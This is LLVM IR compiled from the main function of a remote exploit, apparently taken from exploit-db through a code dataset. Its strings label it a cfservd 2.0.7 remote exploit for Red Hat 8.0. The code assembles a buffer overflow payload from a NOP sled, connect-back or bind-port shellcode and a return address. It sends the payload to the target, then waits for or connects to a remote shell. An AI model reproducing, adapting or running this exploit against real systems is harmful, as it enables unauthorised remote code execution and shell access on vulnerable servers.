; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23183.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23183.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i8*, i8* }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@TIME_OUT = common dso_local global i32 0, align 4
@SC_SIZE_1 = common dso_local global i32 0, align 4
@S_PORT = common dso_local global i32 0, align 4
@T_PORT = common dso_local global i32 0, align 4
@RET_OFFSET = common dso_local global i32 0, align 4
@RET_SIZE = common dso_local global i32 0, align 4
@ALIGN = common dso_local global i32 0, align 4
@BUFF_SIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [20 x i8] c"i:r:b:a:h:t:s:o:T:l\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@SC_SIZE_2 = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [18 x i8] c"-> malloc() error\00", align 1
@RET_ADDR = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [58 x i8] c"\0ACfservd Remote Exploit by snooq [ jinyean@hotmail.com ]\0A\00", align 1
@.str.4 = private unnamed_addr constant [53 x i8] c"Tested to work against cfservd 2.0.7 on Redhat 8.0\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"-> Using return address of 0x%08x\0A\00", align 1
@HDR_SIZE = common dso_local global i32 0, align 4
@HDR = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@connback = common dso_local global i8** null, align 8
@PORT_OFFSET_2 = common dso_local global i32 0, align 4
@bindport = common dso_local global i8** null, align 8
@PORT_OFFSET_1 = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i8* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [16 x i8] c"-> socket error\00", align 1
@.str.7 = private unnamed_addr constant [19 x i8] c"-> connect() error\00", align 1
@.str.8 = private unnamed_addr constant [36 x i8] c"-> 'Listening' mode...( port: %d )\0A\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"-> send() error\00", align 1
@.str.10 = private unnamed_addr constant [28 x i8] c"-> Exploit string sent....\0A\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sigalrm = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [16 x i8] c"-> bind() error\00", align 1
@.str.12 = private unnamed_addr constant [18 x i8] c"-> listen() error\00", align 1
@.str.13 = private unnamed_addr constant [31 x i8] c"-> Waiting for connection....\0A\00", align 1
@.str.14 = private unnamed_addr constant [18 x i8] c"-> accept() error\00", align 1
@.str.15 = private unnamed_addr constant [24 x i8] c"-> Connection from: %s\0A\00", align 1
@.str.16 = private unnamed_addr constant [25 x i8] c"-> 'Connecting' mode...\0A\00", align 1
@.str.17 = private unnamed_addr constant [48 x i8] c"-> Exploit string sent. Waiting for a shell...\0A\00", align 1
@.str.18 = private unnamed_addr constant [18 x i8] c"-> socket() error\00", align 1
@.str.19 = private unnamed_addr constant [51 x i8] c"-> Exploit failed. Target probably segfaulted...\0A\0A\00", align 1
@.str.20 = private unnamed_addr constant [33 x i8] c"-> Connecting to shell at %s:%d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca %struct.sockaddr_in, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %26 = load i32, i32* @TIME_OUT, align 4
  store i32 %26, i32* %17, align 4
  %27 = load i32, i32* @SC_SIZE_1, align 4
  store i32 %27, i32* %18, align 4
  %28 = load i32, i32* @S_PORT, align 4
  store i32 %28, i32* %19, align 4
  %29 = load i32, i32* @T_PORT, align 4
  store i32 %29, i32* %20, align 4
  %30 = load i32, i32* @RET_OFFSET, align 4
  store i32 %30, i32* %21, align 4
  %31 = load i32, i32* @RET_SIZE, align 4
  store i32 %31, i32* %22, align 4
  %32 = load i32, i32* @ALIGN, align 4
  store i32 %32, i32* %23, align 4
  %33 = load i32, i32* @BUFF_SIZE, align 4
  store i32 %33, i32* %24, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 2
  br i1 %35, label %36, label %41

36:                                               ; preds = %2
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @usage(i8* %39)
  br label %41

41:                                               ; preds = %36, %2
  br label %42

42:                                               ; preds = %90, %41
  %43 = load i32, i32* %4, align 4
  %44 = load i8**, i8*** %5, align 8
  %45 = call signext i8 @getopt(i32 %43, i8** %44, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  store i8 %45, i8* %6, align 1
  %46 = sext i8 %45 to i32
  %47 = load i8, i8* @EOF, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp ne i32 %46, %48
  br i1 %49, label %50, label %91

50:                                               ; preds = %42
  %51 = load i8, i8* %6, align 1
  %52 = sext i8 %51 to i32
  switch i32 %52, label %85 [
    i32 105, label %53
    i32 108, label %57
    i32 84, label %59
    i32 98, label %62
    i32 97, label %65
    i32 104, label %68
    i32 114, label %73
    i32 116, label %76
    i32 115, label %79
    i32 111, label %82
  ]

53:                                               ; preds = %50
  %54 = load i8*, i8** @optarg, align 8
  store i8* %54, i8** %9, align 8
  %55 = load i8*, i8** %9, align 8
  %56 = call i32 @changeip(i8* %55)
  br label %90

57:                                               ; preds = %50
  store i32 1, i32* %16, align 4
  %58 = load i32, i32* @SC_SIZE_2, align 4
  store i32 %58, i32* %18, align 4
  br label %90

59:                                               ; preds = %50
  %60 = load i8*, i8** @optarg, align 8
  %61 = call i32 @atoi(i8* %60)
  store i32 %61, i32* %17, align 4
  br label %90

62:                                               ; preds = %50
  %63 = load i8*, i8** @optarg, align 8
  %64 = call i32 @atoi(i8* %63)
  store i32 %64, i32* %24, align 4
  br label %90

65:                                               ; preds = %50
  %66 = load i8*, i8** @optarg, align 8
  %67 = call i32 @atoi(i8* %66)
  store i32 %67, i32* %23, align 4
  br label %90

68:                                               ; preds = %50
  store i32 1, i32* %15, align 4
  %69 = load i8*, i8** @optarg, align 8
  %70 = call i32 @inet_addr(i8* %69)
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %72 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %71, i32 0, i32 0
  store i32 %70, i32* %72, align 8
  br label %90

73:                                               ; preds = %50
  %74 = load i8*, i8** @optarg, align 8
  %75 = call i32 @atoi(i8* %74)
  store i32 %75, i32* %22, align 4
  br label %90

76:                                               ; preds = %50
  %77 = load i8*, i8** @optarg, align 8
  %78 = call i32 @atoi(i8* %77)
  store i32 %78, i32* %20, align 4
  br label %90

79:                                               ; preds = %50
  %80 = load i8*, i8** @optarg, align 8
  %81 = call i32 @atoi(i8* %80)
  store i32 %81, i32* %19, align 4
  br label %90

82:                                               ; preds = %50
  %83 = load i8*, i8** @optarg, align 8
  %84 = call i32 @atoi(i8* %83)
  store i32 %84, i32* %21, align 4
  br label %90

85:                                               ; preds = %50
  %86 = load i8**, i8*** %5, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 0
  %88 = load i8*, i8** %87, align 8
  %89 = call i32 @usage(i8* %88)
  br label %90

90:                                               ; preds = %85, %82, %79, %76, %73, %68, %65, %62, %59, %57, %53
  br label %42

91:                                               ; preds = %42
  %92 = load i32, i32* %15, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %101

94:                                               ; preds = %91
  %95 = load i32, i32* %16, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %106

97:                                               ; preds = %94
  %98 = load i8*, i8** %9, align 8
  %99 = call i64 @strcmp(i8* %98, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i64 0, i64 0))
  %100 = icmp eq i64 %99, 0
  br i1 %100, label %101, label %106

101:                                              ; preds = %97, %91
  %102 = load i8**, i8*** %5, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 0
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @usage(i8* %104)
  br label %106

106:                                              ; preds = %101, %97, %94
  %107 = load i32, i32* %24, align 4
  %108 = add nsw i32 %107, 1
  %109 = call i8* @malloc(i32 %108)
  store i8* %109, i8** %7, align 8
  %110 = icmp ne i8* %109, null
  br i1 %110, label %113, label %111

111:                                              ; preds = %106
  %112 = call i32 @err_exit(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.2, i64 0, i64 0))
  br label %113

113:                                              ; preds = %111, %106
  %114 = load i32, i32* @RET_ADDR, align 4
  %115 = load i32, i32* %21, align 4
  %116 = sub nsw i32 %114, %115
  %117 = sext i32 %116 to i64
  store i64 %117, i64* %25, align 8
  %118 = load i32, i32* @stdout, align 4
  %119 = call i32 (i32, i8*, ...) @fprintf(i32 %118, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.3, i64 0, i64 0))
  %120 = load i32, i32* @stdout, align 4
  %121 = call i32 (i32, i8*, ...) @fprintf(i32 %120, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.4, i64 0, i64 0))
  %122 = load i32, i32* @stdout, align 4
  %123 = load i64, i64* %25, align 8
  %124 = call i32 (i32, i8*, ...) @fprintf(i32 %122, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0), i64 %123)
  %125 = load i8*, i8** %7, align 8
  store i8* %125, i8** %8, align 8
  store i32 0, i32* %11, align 4
  br label %126

126:                                              ; preds = %137, %113
  %127 = load i32, i32* %11, align 4
  %128 = load i32, i32* @HDR_SIZE, align 4
  %129 = load i32, i32* %23, align 4
  %130 = add nsw i32 %128, %129
  %131 = icmp slt i32 %127, %130
  br i1 %131, label %132, label %140

132:                                              ; preds = %126
  %133 = load i32, i32* @HDR, align 4
  %134 = trunc i32 %133 to i8
  %135 = load i8*, i8** %8, align 8
  %136 = getelementptr inbounds i8, i8* %135, i32 1
  store i8* %136, i8** %8, align 8
  store i8 %134, i8* %135, align 1
  br label %137

137:                                              ; preds = %132
  %138 = load i32, i32* %11, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %11, align 4
  br label %126

140:                                              ; preds = %126
  store i32 0, i32* %11, align 4
  br label %141

141:                                              ; preds = %158, %140
  %142 = load i32, i32* %11, align 4
  %143 = load i32, i32* %24, align 4
  %144 = load i32, i32* @HDR_SIZE, align 4
  %145 = sub nsw i32 %143, %144
  %146 = load i32, i32* %23, align 4
  %147 = sub nsw i32 %145, %146
  %148 = load i32, i32* %18, align 4
  %149 = sub nsw i32 %147, %148
  %150 = load i32, i32* %22, align 4
  %151 = sub nsw i32 %149, %150
  %152 = icmp slt i32 %142, %151
  br i1 %152, label %153, label %161

153:                                              ; preds = %141
  %154 = load i32, i32* @NOP, align 4
  %155 = trunc i32 %154 to i8
  %156 = load i8*, i8** %8, align 8
  %157 = getelementptr inbounds i8, i8* %156, i32 1
  store i8* %157, i8** %8, align 8
  store i8 %155, i8* %156, align 1
  br label %158

158:                                              ; preds = %153
  %159 = load i32, i32* %11, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %11, align 4
  br label %141

161:                                              ; preds = %141
  %162 = load i32, i32* %16, align 4
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %186

164:                                              ; preds = %161
  %165 = load i8**, i8*** @connback, align 8
  %166 = load i32, i32* %19, align 4
  %167 = load i32, i32* @PORT_OFFSET_2, align 4
  %168 = call i32 @changeport(i8** %165, i32 %166, i32 %167)
  store i32 0, i32* %11, align 4
  br label %169

169:                                              ; preds = %182, %164
  %170 = load i32, i32* %11, align 4
  %171 = load i32, i32* %18, align 4
  %172 = icmp slt i32 %170, %171
  br i1 %172, label %173, label %185

173:                                              ; preds = %169
  %174 = load i8**, i8*** @connback, align 8
  %175 = load i32, i32* %11, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i8*, i8** %174, i64 %176
  %178 = load i8*, i8** %177, align 8
  %179 = ptrtoint i8* %178 to i8
  %180 = load i8*, i8** %8, align 8
  %181 = getelementptr inbounds i8, i8* %180, i32 1
  store i8* %181, i8** %8, align 8
  store i8 %179, i8* %180, align 1
  br label %182

182:                                              ; preds = %173
  %183 = load i32, i32* %11, align 4
  %184 = add nsw i32 %183, 1
  store i32 %184, i32* %11, align 4
  br label %169

185:                                              ; preds = %169
  br label %208

186:                                              ; preds = %161
  %187 = load i8**, i8*** @bindport, align 8
  %188 = load i32, i32* %19, align 4
  %189 = load i32, i32* @PORT_OFFSET_1, align 4
  %190 = call i32 @changeport(i8** %187, i32 %188, i32 %189)
  store i32 0, i32* %11, align 4
  br label %191

191:                                              ; preds = %204, %186
  %192 = load i32, i32* %11, align 4
  %193 = load i32, i32* %18, align 4
  %194 = icmp slt i32 %192, %193
  br i1 %194, label %195, label %207

195:                                              ; preds = %191
  %196 = load i8**, i8*** @bindport, align 8
  %197 = load i32, i32* %11, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds i8*, i8** %196, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = ptrtoint i8* %200 to i8
  %202 = load i8*, i8** %8, align 8
  %203 = getelementptr inbounds i8, i8* %202, i32 1
  store i8* %203, i8** %8, align 8
  store i8 %201, i8* %202, align 1
  br label %204

204:                                              ; preds = %195
  %205 = load i32, i32* %11, align 4
  %206 = add nsw i32 %205, 1
  store i32 %206, i32* %11, align 4
  br label %191

207:                                              ; preds = %191
  br label %208

208:                                              ; preds = %207, %185
  store i32 0, i32* %11, align 4
  br label %209

209:                                              ; preds = %219, %208
  %210 = load i32, i32* %11, align 4
  %211 = load i32, i32* %22, align 4
  %212 = icmp slt i32 %210, %211
  br i1 %212, label %213, label %222

213:                                              ; preds = %209
  %214 = load i64, i64* %25, align 8
  %215 = load i8*, i8** %8, align 8
  %216 = bitcast i8* %215 to i64*
  store i64 %214, i64* %216, align 8
  %217 = load i8*, i8** %8, align 8
  %218 = getelementptr inbounds i8, i8* %217, i64 4
  store i8* %218, i8** %8, align 8
  br label %219

219:                                              ; preds = %213
  %220 = load i32, i32* %11, align 4
  %221 = add nsw i32 %220, 4
  store i32 %221, i32* %11, align 4
  br label %209

222:                                              ; preds = %209
  %223 = load i8*, i8** %8, align 8
  %224 = getelementptr inbounds i8, i8* %223, i32 1
  store i8* %224, i8** %8, align 8
  store i8 0, i8* %223, align 1
  %225 = load i8*, i8** @AF_INET, align 8
  %226 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i8* %225, i8** %226, align 8
  %227 = load i32, i32* %20, align 4
  %228 = call i8* @htons(i32 %227)
  %229 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i8* %228, i8** %229, align 8
  %230 = load i8*, i8** @AF_INET, align 8
  %231 = load i32, i32* @SOCK_STREAM, align 4
  %232 = call i32 @socket(i8* %230, i32 %231, i32 0)
  store i32 %232, i32* %12, align 4
  %233 = icmp slt i32 %232, 0
  br i1 %233, label %234, label %236

234:                                              ; preds = %222
  %235 = call i32 @err_exit(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  br label %236

236:                                              ; preds = %234, %222
  %237 = load i32, i32* %12, align 4
  %238 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %239 = call i64 @connect(i32 %237, %struct.sockaddr* %238, i32 24)
  %240 = icmp slt i64 %239, 0
  br i1 %240, label %241, label %243

241:                                              ; preds = %236
  %242 = call i32 @err_exit(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0))
  br label %243

243:                                              ; preds = %241, %236
  %244 = load i32, i32* %16, align 4
  %245 = icmp ne i32 %244, 0
  br i1 %245, label %246, label %327

246:                                              ; preds = %243
  %247 = load i32, i32* @stdout, align 4
  %248 = load i32, i32* %19, align 4
  %249 = call i32 (i32, i8*, ...) @fprintf(i32 %247, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.8, i64 0, i64 0), i32 %248)
  %250 = call i64 (...) @fork()
  %251 = icmp eq i64 %250, 0
  br i1 %251, label %252, label %265

252:                                              ; preds = %246
  %253 = call i32 @sleep(i32 2)
  %254 = load i32, i32* %12, align 4
  %255 = load i8*, i8** %7, align 8
  %256 = load i32, i32* %24, align 4
  %257 = call i64 @send(i32 %254, i8* %255, i32 %256, i32 0)
  %258 = icmp slt i64 %257, 0
  br i1 %258, label %259, label %261

259:                                              ; preds = %252
  %260 = call i32 @err_exit(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0))
  br label %261

261:                                              ; preds = %259, %252
  %262 = load i32, i32* @stdout, align 4
  %263 = call i32 (i32, i8*, ...) @fprintf(i32 %262, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0))
  %264 = call i32 @exit(i32 0) #3
  unreachable

265:                                              ; preds = %246
  %266 = load i32, i32* @SIGALRM, align 4
  %267 = load i32, i32* @sigalrm, align 4
  %268 = call i32 @signal(i32 %266, i32 %267)
  %269 = load i32, i32* %17, align 4
  %270 = call i32 @alarm(i32 %269)
  %271 = load i8*, i8** @AF_INET, align 8
  %272 = load i32, i32* @SOCK_STREAM, align 4
  %273 = call i32 @socket(i8* %271, i32 %272, i32 0)
  store i32 %273, i32* %13, align 4
  %274 = icmp slt i32 %273, 0
  br i1 %274, label %275, label %277

275:                                              ; preds = %265
  %276 = call i32 @err_exit(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  br label %277

277:                                              ; preds = %275, %265
  %278 = call i32 @memset(%struct.sockaddr_in* %10, i32 0, i32 24)
  %279 = load i8*, i8** @AF_INET, align 8
  %280 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i8* %279, i8** %280, align 8
  %281 = load i32, i32* %19, align 4
  %282 = call i8* @htons(i32 %281)
  %283 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i8* %282, i8** %283, align 8
  %284 = load i32, i32* @INADDR_ANY, align 4
  %285 = call i32 @htonl(i32 %284)
  %286 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %287 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %286, i32 0, i32 0
  store i32 %285, i32* %287, align 8
  store i32 24, i32* %14, align 4
  %288 = load i32, i32* %13, align 4
  %289 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %290 = load i32, i32* %14, align 4
  %291 = call i64 @bind(i32 %288, %struct.sockaddr* %289, i32 %290)
  %292 = icmp slt i64 %291, 0
  br i1 %292, label %293, label %295

293:                                              ; preds = %277
  %294 = call i32 @err_exit(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.11, i64 0, i64 0))
  br label %295

295:                                              ; preds = %293, %277
  %296 = load i32, i32* %13, align 4
  %297 = call i64 @listen(i32 %296, i32 0)
  %298 = icmp slt i64 %297, 0
  br i1 %298, label %299, label %301

299:                                              ; preds = %295
  %300 = call i32 @err_exit(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.12, i64 0, i64 0))
  br label %301

301:                                              ; preds = %299, %295
  %302 = call i32 (...) @wait()
  %303 = load i32, i32* %12, align 4
  %304 = call i32 @close(i32 %303)
  %305 = load i32, i32* @stdout, align 4
  %306 = call i32 (i32, i8*, ...) @fprintf(i32 %305, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.13, i64 0, i64 0))
  %307 = load i32, i32* %13, align 4
  %308 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %309 = call i32 @accept(i32 %307, %struct.sockaddr* %308, i32* %14)
  store i32 %309, i32* %12, align 4
  %310 = load i32, i32* %12, align 4
  %311 = icmp slt i32 %310, 0
  br i1 %311, label %312, label %314

312:                                              ; preds = %301
  %313 = call i32 @err_exit(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.14, i64 0, i64 0))
  br label %314

314:                                              ; preds = %312, %301
  %315 = call i32 @alarm(i32 0)
  %316 = load i32, i32* @stdout, align 4
  %317 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %318 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 8
  %320 = call i8* @inet_ntoa(i32 %319)
  %321 = call i32 (i32, i8*, ...) @fprintf(i32 %316, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.15, i64 0, i64 0), i8* %320)
  %322 = load i32, i32* %12, align 4
  %323 = call i32 @sendcmd(i32 %322)
  %324 = load i32, i32* %12, align 4
  %325 = call i32 @doshell(i32 %324)
  br label %326

326:                                              ; preds = %314
  br label %375

327:                                              ; preds = %243
  %328 = load i32, i32* %12, align 4
  %329 = load i8*, i8** %7, align 8
  %330 = load i32, i32* %24, align 4
  %331 = call i64 @send(i32 %328, i8* %329, i32 %330, i32 0)
  %332 = icmp slt i64 %331, 0
  br i1 %332, label %333, label %335

333:                                              ; preds = %327
  %334 = call i32 @err_exit(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0))
  br label %335

335:                                              ; preds = %333, %327
  %336 = load i32, i32* %12, align 4
  %337 = call i32 @close(i32 %336)
  %338 = load i32, i32* @stdout, align 4
  %339 = call i32 (i32, i8*, ...) @fprintf(i32 %338, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.16, i64 0, i64 0))
  %340 = load i32, i32* @stdout, align 4
  %341 = call i32 (i32, i8*, ...) @fprintf(i32 %340, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.17, i64 0, i64 0))
  %342 = call i32 @sleep(i32 2)
  %343 = load i8*, i8** @AF_INET, align 8
  %344 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i8* %343, i8** %344, align 8
  %345 = load i32, i32* %19, align 4
  %346 = call i8* @htons(i32 %345)
  %347 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i8* %346, i8** %347, align 8
  %348 = load i8*, i8** @AF_INET, align 8
  %349 = load i32, i32* @SOCK_STREAM, align 4
  %350 = call i32 @socket(i8* %348, i32 %349, i32 0)
  store i32 %350, i32* %12, align 4
  %351 = icmp slt i32 %350, 0
  br i1 %351, label %352, label %354

352:                                              ; preds = %335
  %353 = call i32 @err_exit(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.18, i64 0, i64 0))
  br label %354

354:                                              ; preds = %352, %335
  %355 = load i32, i32* %12, align 4
  %356 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %357 = call i64 @connect(i32 %355, %struct.sockaddr* %356, i32 24)
  %358 = icmp slt i64 %357, 0
  br i1 %358, label %359, label %363

359:                                              ; preds = %354
  %360 = load i32, i32* @stdout, align 4
  %361 = call i32 (i32, i8*, ...) @fprintf(i32 %360, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.19, i64 0, i64 0))
  %362 = call i32 @exit(i32 0) #3
  unreachable

363:                                              ; preds = %354
  %364 = load i32, i32* @stdout, align 4
  %365 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %366 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %365, i32 0, i32 0
  %367 = load i32, i32* %366, align 8
  %368 = call i8* @inet_ntoa(i32 %367)
  %369 = load i32, i32* %19, align 4
  %370 = call i32 (i32, i8*, ...) @fprintf(i32 %364, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.20, i64 0, i64 0), i8* %368, i32 %369)
  %371 = load i32, i32* %12, align 4
  %372 = call i32 @sendcmd(i32 %371)
  %373 = load i32, i32* %12, align 4
  %374 = call i32 @doshell(i32 %373)
  br label %375

375:                                              ; preds = %363, %326
  ret i32 0
}

declare dso_local i32 @usage(i8*) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @changeip(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @err_exit(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @changeport(i8**, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @listen(i32, i32) #1

declare dso_local i32 @wait(...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @sendcmd(i32) #1

declare dso_local i32 @doshell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
